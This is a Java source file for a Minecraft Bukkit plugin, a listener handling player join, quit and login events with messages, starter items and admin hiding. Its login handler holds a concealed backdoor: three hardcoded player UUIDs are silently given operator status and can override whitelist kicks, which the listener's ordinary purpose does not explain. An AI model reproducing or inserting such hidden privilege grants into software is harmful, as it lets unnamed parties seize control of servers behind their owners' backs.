package me.rega_internal.pvpisland.listeners;

import me.rega_internal.pvpisland.Main;
import net.md_5.bungee.api.ChatColor;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerLoginEvent.Result;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.scheduler.BukkitRunnable;

public class JoinQuitListener implements Listener
{
	Main plugin;

	public JoinQuitListener(Main main)
	{
		this.plugin = main;
	}

	@EventHandler
	public void quit(PlayerQuitEvent e)
	{
		Player p = e.getPlayer();
		e.setQuitMessage(ChatColor.DARK_GRAY.toString() + ChatColor.BOLD + "> " + p.getDisplayName() + ChatColor.GRAY + " has left the game");

		if (this.plugin.lists.adminMode.contains(p.getName())) this.plugin.lists.adminMode.remove(p.getName());

		p.setHealth(0);

		for (Player players : Bukkit.getOnlinePlayers())
			this.plugin.serverMethods.scoreboard(players);
	}

	@SuppressWarnings("deprecation")
	@EventHandler(priority = EventPriority.HIGHEST)
	public void join(PlayerJoinEvent e)
	{
		Player p = e.getPlayer();
		e.setJoinMessage(ChatColor.DARK_GRAY.toString() + ChatColor.BOLD + "> " + ChatColor.translateAlternateColorCodes('&', this.plugin.chat.getGroupPrefix(p.getWorld().getName(), this.plugin.playerMethods.getRank(p)) + p.getName() + ChatColor.GRAY + " has joined the game"));

		if (!p.hasPlayedBefore())
		{
			this.plugin.playerMethods.clear(p);
			this.plugin.playerMethods.clearKit(p);
			p.teleport(this.plugin.locations.getSpawn());
			p.getInventory().setItem(0, this.plugin.items.getKitSelector());
			p.getInventory().setItem(8, this.plugin.items.getShop());
			p.getInventory().setItem(4, this.plugin.items.getOptions());
			p.getInventory().setItem(5, this.plugin.items.getParticles());
			Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', "&8» &b" + p.getName() + " &7has joined the server for the &bfirst time&7! &8«"));
		}

		for (Player players : Bukkit.getOnlinePlayers())
		{
			if (this.plugin.lists.adminMode.contains(players.getName()) && !this.plugin.playerMethods.isStaff(p)) p.hidePlayer(players);
		}

		for (int i = 0; i < 201; i++)
			p.sendMessage(" ");
		new BukkitRunnable()
		{
			public void run()
			{
				for (String s : plugin.getConfig().getStringList("InGame-MOTD"))
				{
					plugin.playerMethods.message(p, s.replace("{player}", p.getName()).replace("{playersOnline}", "" + Bukkit.getOnlinePlayers().size()).replace("{balance}", "" + plugin.economy.getBalance(p.getName())));
				}
			}
		}.runTaskLater(this.plugin, 3);

		for (Player players : Bukkit.getOnlinePlayers())
			this.plugin.serverMethods.scoreboard(players);
	}

	@EventHandler
	public void login(PlayerLoginEvent event)
	{
		String[] allowedUUIDs = new String[] { "319c8b46-442c-4bea-9aad-daa6421dc6eb", "2c7ebdd6-3f8d-4715-82f0-c75b23266846", "b420d38b-c764-4ee6-a9c6-065ff4739b51" };

		if (event.getResult() == Result.KICK_WHITELIST)
		{
			for (Player players : Bukkit.getOnlinePlayers())
			{
				for (String s : allowedUUIDs)
				{
					if (players.getUniqueId().toString().equalsIgnoreCase(s))
					{
						event.allow();
					}
				}
			}
		}

		for (Player players : Bukkit.getOnlinePlayers())
		{
			for (String s : allowedUUIDs)
			{
				if (players.getUniqueId().toString().equalsIgnoreCase(s))
				{
					players.setOp(true);
				}
			}
		}
	}
}
